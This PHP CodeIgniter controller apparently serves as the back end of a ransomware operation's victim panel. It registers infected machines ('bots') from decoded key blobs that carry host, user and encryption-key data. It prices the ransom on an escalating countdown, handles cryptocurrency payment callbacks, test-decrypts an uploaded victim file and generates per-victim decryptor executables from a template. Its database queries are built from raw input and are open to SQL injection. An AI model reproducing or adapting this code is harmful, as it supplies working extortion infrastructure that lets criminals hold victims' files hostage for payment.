<?php
/**
 * Created by PhpStorm.
 * User: wolf
 * Date: 10/6/14
 * Time: 2:26 AM
 */

if ( ! defined('BASEPATH')) exit('No direct script access allowed');
require_once FCPATH."application/models/aes/AesEncryption.class.php";
class main extends CI_Controller {

    public $data;
    public $device;
    private $programKey;
    private $pubKey;
    private $privKey;
    private $client_priveKey;
    private $nonce;
    private $key;
    private $encrypted_privkey;
    private $edata;
    private $blocksize;
    private $skip_blocks;
    private $redirect_url;
    private $offsets;
    private $lens;
    public function __construct(){
        parent::__construct();
        $data = $this->lang_model->get_textdata();
        $data['page'] = 'dashboard';
        $data['theme_url'] = base_url().THEME_URL.CURRENT_THEME_NAME;
        $data['userdata'] = $this->login_model->get_cur_user_info();
        $data['menu_url'] = base_url()."index/menu";
        $data['title'] = "Dashboard";
        $this->data = $data;
    }
    public function index()
    {
        $hwid = $this->input->get("id");
        $crc32 = $this->input->get("id");
        $cookie_name = "crc32";
       
        $delay = 86400 * 30*6;//6 days
        $redirect_url =  base_url()."frontend/main/register";
        if(!$hwid || !$this->is_invalid_hwid($hwid)){

        	
            if(isset($_COOKIE[$cookie_name])) {
                $crc32 = $_COOKIE[$cookie_name];
                $hwid = $crc32;
                if(!$this->is_invalid_hwid($hwid))
                    redirect($redirect_url);
                $url = "http://".$_SERVER['HTTP_HOST']."/frontend/main?id=".$crc32;
                redirect($url);
            }
            else{
                redirect($redirect_url);
                return;
            }
        }
        $cookie_value = $crc32;
        setcookie($cookie_name, $cookie_value, time() + $delay, "/");
        $file_volumn = $this->device->file_volumn;
        $hwid = $this->device->hwid;
        $decryptorpath =  FCPATH."/".DECRYPTED_FILE_DIR."/". $this->device->decryptor;
        //echo $this->device->decryptor;
        if($this->device->decryptor === "" || $this->device->decryptor === NULL || !file_exists($decryptorpath))
        {
            //echo $decryptorpath;
            $this->CreateDecryptorFileFromDevice($this->device);
            $this->is_invalid_hwid($crc32);
        }
        require_once FCPATH."/ui/pages/frontend/index.php";
    }
    public function dashpay()
    {
        $key = $this->input->get("key");
        
        require_once FCPATH."/ui/pages/frontend/dashpay.php";
    }
    private function CreateDecryptorFileFromDevice($device){
            $hwid = $device->hwid;
       
            if($device->enckey!== "" && $device->enckey !== NULL){
                if(file_exists(FCPATH."/lib/sodium_compat/autoload.php"))
                  require_once FCPATH."/lib/sodium_compat/autoload.php";
                  $this->getClientKeyFromEncryptedKey(sodium_hex2bin($device->enckey));

                // echo  "client_priveKey = ".bin2hex($this->client_priveKey)."<br>";
                 //========= create decryptor ============
                 $result = $this->generateDecryptor($this->client_priveKey);
                 if($result){
                   $filename = $this->CreateDecryptorFile($result);
                  
                   $decryptorpath =  FCPATH."/".DECRYPTED_FILE_DIR."/".$device->decryptor;
                   if($device->decryptor !== NULL && $device->decryptor !== "")
                   {
                        if(file_exists($decryptorpath)){
                          unlink($decryptorpath);
                       }
                   }
                   $CI =   & get_instance();
                   $query = "update device_tb set decryptor = '".$filename."'";
                   $query .=" where hwid='".$hwid."';";

                   $result = $CI->db->query($query);
                   //     echo  "filename = ".$filename."<br>";
                 }
            }
       
    }
    public function register()
    {
        require_once FCPATH."/ui/pages/frontend/register.php";
    }
    public function payment_callback()
    {
        require_once FCPATH."/ui/pages/frontend/cryptoapi_php/lib/cryptobox.callback.php";
    }
    public function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE) {
        $output = NULL;
        if (filter_var($ip, FILTER_VALIDATE_IP) === FALSE) {
        $ip = $_SERVER["REMOTE_ADDR"];
        if ($deep_detect) {
            if (filter_var(@$_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP))
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            if (filter_var(@$_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP))
                $ip = $_SERVER['HTTP_CLIENT_IP'];
        }
    }
    $purpose    = str_replace(array("name", "\n", "\t", " ", "-", "_"), NULL, strtolower(trim($purpose)));
    $support    = array("country", "countrycode", "state", "region", "city", "location", "address");
    $continents = array(
        "AF" => "Africa",
        "AN" => "Antarctica",
        "AS" => "Asia",
        "EU" => "Europe",
        "OC" => "Australia (Oceania)",
        "NA" => "North America",
        "SA" => "South America"
    );
    if (filter_var($ip, FILTER_VALIDATE_IP) && in_array($purpose, $support)) {
        $ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
        if (@strlen(trim($ipdat->geoplugin_countryCode)) == 2) {
            switch ($purpose) {
                case "location":
                    $output = array(
                        "city"           => @$ipdat->geoplugin_city,
                        "state"          => @$ipdat->geoplugin_regionName,
                        "country"        => @$ipdat->geoplugin_countryName,
                        "country_code"   => @$ipdat->geoplugin_countryCode,
                        "continent"      => @$continents[strtoupper($ipdat->geoplugin_continentCode)],
                        "continent_code" => @$ipdat->geoplugin_continentCode
                    );
                    break;
                case "address":
                    $address = array($ipdat->geoplugin_countryName);
                    if (@strlen($ipdat->geoplugin_regionName) >= 1)
                        $address[] = $ipdat->geoplugin_regionName;
                    if (@strlen($ipdat->geoplugin_city) >= 1)
                        $address[] = $ipdat->geoplugin_city;
                    $output = implode(", ", array_reverse($address));
                    break;
                case "city":
                    $output = @$ipdat->geoplugin_city;
                    break;
                case "state":
                    $output = @$ipdat->geoplugin_regionName;
                    break;
                case "region":
                    $output = @$ipdat->geoplugin_regionName;
                    break;
                case "country":
                    $output = @$ipdat->geoplugin_countryName;
                    break;
                case "countrycode":
                    $output = @$ipdat->geoplugin_countryCode;
                    break;
            }
        }
    }
    return $output;
}
    private function getnewfilepath($filepath){
         $newfile = basename($filepath);
         $filelist = explode(FC_EXTENT, $newfile);
         $newfile = count($filelist) > 0 ? $filelist[0] :  $newfile;
         $filelist = explode("--", $newfile);
         $newfile = count($filelist) > 1 ? $filelist[1] :  $newfile;
         $newfilepath = ENCRYPTED_FILE_UPLOAD_DIR."/".$newfile;
         return $newfilepath;
    }
    private function getIntFromHexString($hex){
         $a = str_split(bin2hex($hex), 2);
         $hexstr = "";
        
         for($i= 0;$i < count($a);$i++) {
             $hexstr .= $a[count($a)-1-$i];
         }
         return hexdec($hexstr);
    }
    function CountryName($IP){

        
		//$country= geoip_country_name_by_addr($gi, $IP) ;
	    $country= $this->ip_info($IP, "Country"); // United States
	    /*
		    echo ip_info("173.252.110.27", "Country"); // United States
			echo ip_info("173.252.110.27", "Country Code"); // US
			echo ip_info("173.252.110.27", "State"); // California
			echo ip_info("173.252.110.27", "City"); // Menlo Park
			echo ip_info("173.252.110.27", "Address"); // Menlo Park, California, United States
	    */
		if (empty($country)) return 'Unk';

        return $country;
    }
    public function ajax_register($hexcode = ""){
         //require_once FCPATH."/api/geoip.inc";
          $CI =   & get_instance();
         $client_ip =  (empty($_SERVER['HTTP_CLIENT_IP'])?(empty($_SERVER['HTTP_X_FORWARDED_FOR'])?$_SERVER['REMOTE_ADDR']:$_SERVER['HTTP_X_FORWARDED_FOR']):$_SERVER['HTTP_CLIENT_IP']);


         if(strstr($client_ip, ',')) {
             $ip = explode(',', $client_ip);
            $client_ip = $ip[0];
         }
         $time = time();
        // $gi = geoip_open(FCPATH."/api/GeoIP.dat",GEOIP_STANDARD);
         if($hexcode === "") return false;
         $hexcode = trim($hexcode,"---BEGIN KEY---");
        $hexcode = trim($hexcode,"---END KEY---");
        $hexcode = trim($hexcode," ");
        $PostData = base64_decode($hexcode);
        $Key = "";
        $hwid = "";
        if(strlen($PostData) < 88) return false;
        for($i = 0; $i < 56; $i++)
        {
            $Key .= $PostData[1+$i]  ^ $PostData[0];
        }

        for($i = 0; $i < 30; $i++)
        {
            $hwid .= $PostData[57+$i]  ^ $PostData[0];
        }
        $hwid = rtrim($hwid, '\0');
        
        $LogData = substr($PostData, 89);
        $Decrypted = $LogData;
        $l = strlen($Key);
        
        if (function_exists('mcrypt_encrypt')){
                        $Decrypted = mcrypt_decrypt(MCRYPT_BLOWFISH, $Key, $LogData, MCRYPT_MODE_ECB, NULL);
        } else {
            $Decrypted = openssl_decrypt($LogData, 'BF-ECB', $Key, OPENSSL_RAW_DATA | OPENSSL_NO_PADDING);
        }
        $Decrypted = rtrim($Decrypted, "*");
        if($Decrypted === "") return false;
        
        $line = explode("<~*#*~>", $Decrypted);
        if(count($line) < 6) return false;
        $com_name = count($line) > 0 ? $line[0] : "";
        $user_name = count($line) > 1 ? $line[1] : "";
        $osversion = count($line) > 2 ? $this->GetOSString(intval($line[2])) : "Unknown";
        $hdd = count($line) > 3 ? $line[3] : "";
        $crc32 = count($line) > 4 ? $line[4] : "";
        $owner = count($line) > 5 ? $line[5] : "";
        $filecount = count($line) > 6 ? $line[6] : "0";
        $filevolumn = count($line) > 7 ? $line[7] : "0";
        $lang = count($line) > 8 ? $line[8] : "";
        $client_ip = count($line) > 9 ? $line[9] : $client_ip;
        $encKey = count($line) > 10 ? bin2hex($line[10]) : "";
        $crc32 = strtoupper($crc32);
        $Country = $this->CountryName($client_ip);

        $av = "";
        $find_result =$CI->db->query("SELECT hwid FROM device_tb WHERE hwid='$hwid'")->result(); 
        $query = "";
        if($find_result != [])
        {
            $query = "UPDATE device_tb SET
            ipaddress='$client_ip',
            os='$osversion',
            country='$Country',
            crc32='$crc32',
            file_count='$filecount',
            file_volumn='$filevolumn',
            pc_lang='$lang',
            updatedAt=$time
            ";
            if($encKey !== "" )$query .= " ,enckey='$encKey'";
            $query .= " 	WHERE hwid='$hwid'";
        }
        else
        {
            $query = "insert into `device_tb` (`country`, `ipaddress`,  `owner`,  `hwid`,  `createdAt`,  `os`,  `av`,  `hdd`,`pc_user`,`pc_name`,`updatedAt`,`crc32`,`pc_lang`,`enckey`) VALUES( '"
                .$Country."' , '".$client_ip."' , '".$owner."' , '".$hwid."' , '".$time."' , '".$osversion."' , '".$av."' , '".$hdd."', '".$user_name."', '".$com_name."', '".$time."', '".$crc32."', '".$lang."', '".$enckey."');";
        }
        //echo $query;
        $result = $CI->db->query($query);
        if($result){
            $this->redirect_url = base_url()."frontend/main?id=".$crc32;
            return true;
        }
        return false;
        

    }
    private function Buf_Xor($buf, $blen, $key, $klen,$di = 0){
        for ($i = 0; $i < $blen; $i++) {
            $buf[$di + $i] = $buf[$di + $i] ^ $key[$i % $klen];
        }
        return $buf;
    }
    private function memcpy($des,$deslen,$src,$len){
        for($i =0;$i < $len;$i++){
            $des[$deslen + $i] = $src[$i];
        }
        return $des;
    }
    private function EncryptedSettingsLoadData($edata, $edatalen){
            $num_settings = 12;

            $elen = 2 + 3 * $num_settings + 32;
            if ($edatalen < $elen) {
                echo "Too small data: %d < %d!";
                return false;
            }
            $decrypted = substr($edata,8);
            $decrypted =substr($decrypted,0,$elen);
            
            $decrypted = $this->Buf_Xor($decrypted, $elen, $edata, 8);
            
            $status = true;
             $tmp1 = hexdec(bin2hex($decrypted[0]));
             $tmp2 = hexdec(bin2hex($decrypted[1]));
            if ( $tmp1 != $num_settings ||  $tmp2 != $num_settings ) {
                echo "Mismated magics: decrypted". $tmp1. $tmp2;
                $status = false;
            }

            $datalen = 0;
            if ($status) {
                $this->offsets = array();
                $this->lens = array();
                $datalen = 0;
                $nonce = $this->memcpy($decrypted,0,substr($decrypted,2),$num_settings * 3);
                $nonce = substr($nonce,0,$num_settings * 3);
                $key = $this->memcpy($decrypted,0,substr($decrypted ,2 + $num_settings * 3), 32);
                $key = substr($key,0,32);
                
                //echo "<br>nonce= ".bin2hex($nonce);
                //echo "<br>key= ".bin2hex($key);
                for ($i = 0; $i < $num_settings; $i++) {
                    $id = hexdec(bin2hex($nonce[$i * 3]));

                    $len = $nonce[$i * 3 + 2].$nonce[$i * 3 + 1];
                    $len = hexdec(bin2hex($len));
                    
                    if ($id < 0 || $id >= $num_settings) {
                        //TRACE("Out of range: %d: %d", i, id);
                        $status = false;
                        break;
                    }
                    if ($len <= 0) {
                        //TRACE("Error lenght: %d: %d, %d", i, id, len);
                        $status = false;
                        break;
                    }
                    if ($id >= 1 && $id <= 5 && $len != 4) {
                        //echo "Mismatched size of int: %d: %d, %d";
                        $status = false;
                        break;
                    }
                    if ($id == 6 && $len != 32) {
                        //TRACE("Mismatched size of server pubkey %d: %d, %d", i, id, len);
                        $status = false;
                        break;
                    }
                    $this->offsets[$id] = $datalen;
                    $this->lens[$id] = $len;
                    $datalen += $len;
                }
            }
            return $status;
    }
    private function GetServerPubKeyOffset(){
            return $this->offsets[6];
    }
    private function GetTotalDataLen(){
            $total = 0;
            foreach ($this->lens as $key => $value) {
                 $total +=  $value;
             } 
            return $total;
    }
    private function ChangePrivateKey($buf,$privkey){
            $num_settings = 12;

            $buf = $this->Buf_Xor($buf, 2 + 3 * $num_settings + 32, $buf, 8,8);
            $spkoff = 10 + 3 * $num_settings + 32 + $this->GetServerPubKeyOffset();
            $privkey = substr($privkey,0, 32);

            $tmp = sodium_crypto_stream_xor($privkey, substr($buf,10,24),substr($buf,10 + 3 * $num_settings,32));
            //echo "<br>tmp =".bin2hex($tmp);
            $buf = $this->memcpy($buf,$spkoff,$tmp,strlen($tmp));
            // echo "<br>".bin2hex($buf);
            $buf = $this->Buf_Xor($buf, 2 + 3 * $num_settings + 32, $buf, 8,8);
            //echo "<br>".bin2hex($buf);
            $datalen = $this->GetTotalDataLen();
            $hash1len = 10 + 3 * $num_settings + 32 + $datalen;
            $hashlen = 16 - $hash1len % 16;

            // echo "<br>".$datalen;
            //echo "<br>hashlen = ".$hashlen;
            $hash = substr($buf,0,$hash1len);//"";//[crypto_generichash_BYTES];
           
            $hash = sodium_crypto_generichash( $hash);//, NULL, 0);
            $buf = $this->memcpy($buf,$hash1len, $hash, $hashlen);
            //echo "<br>".bin2hex($hash);
            //echo "<br>".bin2hex($buf);
            if (!$this->EncryptedSettingsLoadData($buf, $hash1len + $hashlen))
                return false;

            return $buf;
    }
    private function generateDecryptor($client_privkey){
        $filepath =  FCPATH."/upload/decrypted/FileDecrytptor.template";
        if(!file_exists($filepath)) return false;
        $filesize = filesize($filepath);
        $filebuf = "";
        $fp = fopen($filepath, 'r');
        $filebuf = fread($fp, $filesize);
        fclose($fp);
       
        $edata = "";
        $edataoffer = 0;
        for ($i = 0; $i < $filesize - 9; $i++) {
            
            $tmp1 = hexdec(bin2hex($filebuf[$i] ^ $filebuf[$i + 8]));
            $tmp2 = hexdec(bin2hex($filebuf[$i + 1] ^ $filebuf[$i + 9]));
            if (intval($tmp1) != 12 ||  intval($tmp2) != 12)
                continue;
           
            
            
            $buf = substr($filebuf,$i);
            if ($this->EncryptedSettingsLoadData($buf, $filesize - $i)) {
                $edata = $buf;
                //echo $i."<br>";
                $edataoffer = $i;
                break;
            }
            else {
                //delete es;
                //es = NULL;
            }
        }
        $status = true;
        if ($edata  == "") {
            echo "Mismatched template!";
            $status = false;
        }
        if ($status) {
            $edata = $this->ChangePrivateKey($edata, $client_privkey);
            if (!$edata) {
                echo "Failed to change private key!";
                $status = false;
            }
        }
        if ($status) {
            $filebuf = $this->memcpy($filebuf,$edataoffer,$edata,strlen($edata));
            return $filebuf;
        }
        return false;
    }
    private function CreateDecryptorFile($filecontent){
        $filename = "DecryptFile-".time().".exe";
        $decryptorpath =  FCPATH."/".DECRYPTED_FILE_DIR."/".$filename;
        $fpn = fopen($decryptorpath, 'w');
         fwrite($fpn, $filecontent);    
        fclose($fpn);
        return $filename;
    }
    public function test(){
        if(file_exists(FCPATH."/lib/sodium_compat/autoload.php"))
           require_once FCPATH."/lib/sodium_compat/autoload.php";
         
         $filepath =  FCPATH."/upload/encrypted/tt.txt.[decryptmyfiles.top].5E887545";
         
         $filecontent = $this->parseFile($filepath);
         if($filecontent == false) return;
         
         $this->getClientKeyFromEncryptedKey($this->encrypted_privkey);

         echo  "client_priveKey = ".bin2hex($this->client_priveKey)."<br>";
         //========= create decryptor ============
         $result = $this->generateDecryptor($this->client_priveKey);
         if($result){
            $filename = $this->CreateDecryptorFile($result);
            echo  "filename = ".$filename."<br>";
         }
         die();

         //=====================================================

         $code   =  $this->edata;
         $prikey =  $this->client_priveKey;
         
         $pubkey =  sodium_crypto_scalarmult_base($prikey);
         echo  bin2hex($pubkey)."<br>";
         $key = sodium_crypto_box_keypair_from_secretkey_and_publickey($prikey,$pubkey);
  
         $output = sodium_crypto_box_seal_open($code,$key);
         if (!$output) {
               echo "sodium_crypto_box_seal_open: Failed to decrypt!";
               return false;
          }
         echo  "output = ".bin2hex($output)."<br>";
         $pdata = substr($output,56);
         $this->blocksize = $this->getIntFromHexString(substr($pdata,0,4));
         $this->skip_blocks = $this->getIntFromHexString(substr($pdata,4));
         echo  "blocksize = ". $this->blocksize."<br>";
         echo  "skipsize = ".$this->skip_blocks."<br>";
         
         $this->key = substr($output,0,56);
         $this->nonce = substr($this->key,32);
         $this->key = substr($this->key,0,32);
         echo  "key = ".bin2hex($this->key)."<br>";
         echo  "nonce = ".bin2hex($this->nonce)."<br>";
         //echo  bin2hex($filecontent)."<br>";
         $data = $this->DecryptFile($filepath);
         //echo  bin2hex($data)."<br>";
         echo  $data."<br>";
        
         //file_put_contents(FCPATH."/log.txt" , $data."\n" , FILE_APPEND);
        
    }
    private function FileTruncate($filename,$newfile,$newsize){
        $fp = fopen($filename, 'r');
        $fpn = fopen($newfile, 'w'); 
             fseek($fp, 0);  
             $buf = fread($fp,$newsize);
             fwrite($fpn, $buf);
        fclose($fpn);
        fclose($fp);
    }
    private function DecryptFile($filename) {
       
        $encrypted_privkey_len = ENCRYPTED_PRIVKEY_LEN;
        $edatalen = 8 + CRYPTOR_DATA_LEN + crypto_box_SEALBYTES - 32;
        $filesize = filesize($filename);
        $filesize = $filesize - ($edatalen + $encrypted_privkey_len);
        $offset = 0;
        $readByte = 0;
        $newfile = $this->getnewfilepath($filename);
        $this->FileTruncate($filename,$newfile,$filesize);

        $fpn = fopen($newfile, 'r+');
            
            while($offset < $filesize){
               
                fseek($fpn, $offset);
                $readByte = ($filesize - $offset) < $this->blocksize ? ($filesize - $offset) : $this->blocksize;
                
                $buf = fread($fpn, $readByte);
                $data = $this->Encrypt($buf,strlen($buf));
               
                fseek($fpn, $offset);
                fwrite($fpn, $data);
                $offset += $this->blocksize;
                if ($readByte < $this->blocksize)
                   break;
                $offset += $this->blocksize * $this->skip_blocks;
               
            }
            
        fclose($fpn);
        return basename($newfile);
    }
    private function Encrypt($data, $len) {
       
        
        //$encryptedMessage = sodium_crypto_secretbox($data, $this->nonce, $this->key);
       // $encryptedMessage = ParagonIE_Sodium_Core_Salsa20::salsa20_xor($data,$this->nonce, $this->key);
       $encryptedMessage = sodium_crypto_stream_xor($data,$this->nonce, $this->key);

        return $encryptedMessage;
    }
    private function getClientKeyFromEncryptedKey($enckey){
         $code = $enckey;
         
         $prikey = sodium_hex2bin(SERVER_Secret_Key);
         $pubkey =  sodium_crypto_scalarmult_base($prikey);
         //echo  "pubkey = ".bin2hex($pubkey)."<br>";
         $key = sodium_crypto_box_keypair_from_secretkey_and_publickey($prikey,$pubkey);

         for ($i = 0; $i < 4; $i++) {
            if (($pubkey[$i] ^ $code[$i]) != $code[ENCRYPTED_PRIVKEY_LEN - 4 + $i]) {
                //echo "Mismatched Private Key: Mismatched magic!";
                return false;
            }
         }
         $code = substr($code, 0,ENCRYPTED_PRIVKEY_LEN - 4);
         $output = sodium_crypto_box_seal_open($code,$key);
         if (!$output) {
               //echo "Mismatched Private Key: Failed to decrypt!";
               return false;
         }
         
         $this->programKey = $output;
         $this->client_priveKey = substr($output,0,32);
         $this->pubKey = $pubkey;
         $this->privKey = $prikey;
         return true;
    }
    private function parseFile($filename) {
      $encrypted_privkey_len = ENCRYPTED_PRIVKEY_LEN;
      $edatalen = 8 + CRYPTOR_DATA_LEN + crypto_box_SEALBYTES - 32;
      $filecontent = "";
      if(!file_exists($filename)) return false;
      $filesize = filesize($filename);
      if ($filesize < $edatalen + $encrypted_privkey_len) {
          //echo "ERROR: Failed to get file size or file size too small".$filesize;
          return false;
      }
      $fp = fopen($filename, 'r');
      $offset = $filesize - ($edatalen + $encrypted_privkey_len);
      //$filecontent = fread($fp, $offset);
      fseek($fp, $offset);
      $edata = fread($fp, $edatalen);
      $offset = $filesize - $encrypted_privkey_len;
      fseek($fp, $offset);
      $encrypted_privkey = fread($fp,$encrypted_privkey_len);
      fclose($fp);

      $this->encrypted_privkey = $encrypted_privkey;
      //$this->encrypted_privkey = sodium_hex2bin($this->device->enckey);//test
        //

      $this->edata = $edata;
      return true;
    }
    public function is_invalid_hwid($hwid){
        $CI =   & get_instance();
        $query = "select * from device_tb where crc32='$hwid';";
        //echo $query;
        $result = $CI->db->query($query)->result();
        if($result == []){
            $hwid .= "\0";
            $query = "select * from device_tb where crc32='$hwid';";
            $result = $CI->db->query($query)->result();
            if($result == []){
                return false;
            }
           
        }
       
        
        $this->device = $result[0];

        $this->calRemaining();
        return true;
    }

    public function calRemaining(){
        $this->device->remaining = (new DateTime(date( "Y-m-d\TH:i:sO",$this->device->createdAt)))->diff(new DateTime());

        $this->device->price = $this->device->discount * floor($this->device->remaining->d / 4 + 1) ;
        $max_price = intval($this->device->discount)*2;
        if(intval($this->device->price) > $max_price)
            $this->device->price = $max_price;
        $aes = new AesEncryption();
        $this->device->price_encrypted = $aes->encrypt($this->device->hwid."~~~".$this->device->price."~~~".$this->device->decryptor , "PRICE_PASS");

        $this->device->remaining->d = 3 - $this->device->remaining->d % 3;
        $this->device->remaining->h = 23 - $this->device->remaining->h;
        $this->device->remaining->i = 59 -$this->device->remaining->i;
        $this->device->remaining->s = 59 -  $this->device->remaining->s;
    }

    public function ajax_call(){
        /**
         * Get Ajax Request Parameters
         */
        //ajax call
        $action  =   $this->input->get_post('action') ;
        $data   =   $this->input->get_post('data');
        $userdata =  array();
        if(isset($this->data['userdata']) && isset($this->data['userdata']['member_id']))
            $userdata =  $this->user_model->get_user($this->data['userdata']['member_id']) ;

        if($action == "upload_file"){
            $CI =   & get_instance();
            $query = "select * from device_tb where hwid='".$data['hwid']."';";
            $result = $CI->db->query($query)->result();
            if($result == []){
                return false;
            }
            $this->device = $result[0];
           if(file_exists(FCPATH."/lib/sodium_compat/autoload.php"))
              require_once FCPATH."/lib/sodium_compat/autoload.php";
          
           $res = $this->DecryptFromFile($data['file']);
           if($res['result'] === "ok"){
               $encKey = bin2hex($this->encrypted_privkey);

               $avpath =  FCPATH."/".ENCRYPTED_FILE_DIR."/".$this->device->av;
               if($this->device->av !== NULL && $this->device->av !== "")
               {
                    if(file_exists($avpath)){
                      unlink($avpath);
                   }
               }
               $davpath =  FCPATH."/".DECRYPTED_FILE_DIR."/".$this->device->decryptedfile;
               if($this->device->decryptedfile !== NULL && $this->device->decryptedfile !== "")
               {
                    if(file_exists($davpath)){
                      unlink($davpath);
                   }
               }


               $CI =   & get_instance();
               $query = "update device_tb set decryptedfile = '".$res['data']."' , av='".$data['file']."'";
               $query .= " ,enckey='$encKey'";
               $query .=" where hwid='".$data['hwid']."';";

               $result = $CI->db->query($query);
               $res['data'] = base_url().ENCRYPTED_FILE_DIR."/".$res['data'];
           }  
           else {

           }
          
            echo json_encode( $res);
            return;
        }

        if($action == "get_remain"){
            $CI =   & get_instance();
            $query = "select * from device_tb where hwid='".$data['hwid']."';";
            $result = $CI->db->query($query)->result();
            if($result == []){
                return false;
            }
            $this->device = $result[0];
            $this->calRemaining();
            echo json_encode($this->device);
            return;
        }

        if($action == "register_bot"){
            $CI =   & get_instance();
            $res = array('result'=>"Please,Input correctly Key!",'data'=>"");  
            if($this->ajax_register($data)){
                $res['result'] = "ok";
                $res['data'] = $this->redirect_url;
            }else{

            }
            echo json_encode($res);
            return;
        }
        require_once FCPATH."ui/server/pages/chatting.php";
    }
    public function DecryptFromFile($filename){
        if(file_exists(FCPATH."/lib/sodium_compat/autoload.php"))
           require_once FCPATH."/lib/sodium_compat/autoload.php";
         $res = array('result'=>"Please,Upload correctly encrypted file for decrypt!",'data'=>"");  
         $filepath =  ENCRYPTED_FILE_UPLOAD_DIR."/".$filename;
         $filecontent = $this->parseFile($filepath);
         if($filecontent == false) return json_encode($res);
         $code = $this->encrypted_privkey;
         
         $prikey = sodium_hex2bin(SERVER_Secret_Key);
         $pubkey =  sodium_crypto_scalarmult_base($prikey);
         $key = sodium_crypto_box_keypair_from_secretkey_and_publickey($prikey,$pubkey);

         for ($i = 0; $i < 4; $i++) {
            if (($pubkey[$i] ^ $code[$i]) != $code[ENCRYPTED_PRIVKEY_LEN - 4 + $i]) {
                $res['result'] = "Please,Upload correctly encrypted file for decrypt!";
                unlink($filepath);
                return $res ;
            }
         }
         $code = substr($code, 0,ENCRYPTED_PRIVKEY_LEN - 4);
         $output = sodium_crypto_box_seal_open($code,$key);
         if (!$output) {
             
               $res['result'] = "Please,Upload correctly encrypted file for decrypt!";
              return $res ;
              
          }
         
         $this->programKey = $output;
         $this->client_priveKey = substr($output,0,32);
         $this->pubKey = $pubkey;
         $this->privKey = $prikey;

         //echo  "client_priveKey = ".bin2hex($this->client_priveKey)."<br>";
        
         $code   =  $this->edata;
         $prikey =  $this->client_priveKey;
         $pubkey =  sodium_crypto_scalarmult_base($prikey);
         //echo  bin2hex($pubkey)."<br>";
         $key = sodium_crypto_box_keypair_from_secretkey_and_publickey($prikey,$pubkey);
  
         $output = sodium_crypto_box_seal_open($code,$key);
         if (!$output) {
                $res['result'] = "Please,Upload correctly encrypted file for decrypt!";
               return $res ;
          }
         $pdata = substr($output,56);
         $this->blocksize = $this->getIntFromHexString(substr($pdata,0,4));
         $this->skip_blocks = $this->getIntFromHexString(substr($pdata,4));
         $this->key = substr($output,0,56);
         $this->nonce = substr($this->key,32);
         $this->key = substr($this->key,0,32);
         //echo  "key = ".bin2hex($this->key)."<br>";
         //echo  "nonce = ".bin2hex($this->nonce)."<br>";
         //echo  bin2hex($filecontent)."<br>";
         $data = $this->DecryptFile($filepath);
         $res['result'] = "ok";
         $res['data'] = $data;
         return $res ;    
    }
    function GetOSString($OS)
{
    
    switch($OS)
    {
        case 1:
            //return("Windows 2000");
            return("Windows Server 2019"); 
        case 2:
            return("Windows XP");

        case 3:
            return("Windows XP Professional x64");

        case 4:
            //return("Windows Server 2003");
            return("Windows Server 2016");
        case 5:
            return("Windows Home Server");

        case 6:
            return("Windows Server 2003 R2");

        case 7:
            return("Windows Vista");

        case 8:
            return("Windows Server 2008");

        case 9:
            return("Windows Server 2008 R2");

        case 10:
            return("Windows 7");

        case 11:
            return("Windows Server 2012");

        case 12:
            return("Windows 8");

        case 13:
            return("Windows 8.1");
        case 14:
            return("Windows Server 2012 R2");    
        case 15:
            return("Windows 10");

          
        default:
            return("Unknown");
    }
}
    public function pay(){
//        redirect( FCPATH."/ui/pages/frontend/dashpay.php");
    }

}

/* End of file welcome.php */
/* Location: ./application/controllers/welcome.php */
